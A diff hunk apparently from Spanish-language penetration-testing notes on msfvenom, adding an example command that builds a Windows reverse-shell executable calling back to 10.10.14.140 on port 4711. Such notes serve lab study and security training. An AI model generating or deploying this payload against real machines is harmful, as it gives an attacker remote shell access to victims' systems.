@@ -2573,6 +2573,12 @@ Para ver las payloads disponibles.
 msfvenom -l payloads | grep java
 ```
 
+Ejemplo de playload en .exe
+
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.140 LPORT=4711 -f exe -o shell.exe
+```
+
 ## Multiples interfaces
 
 Usa el comando
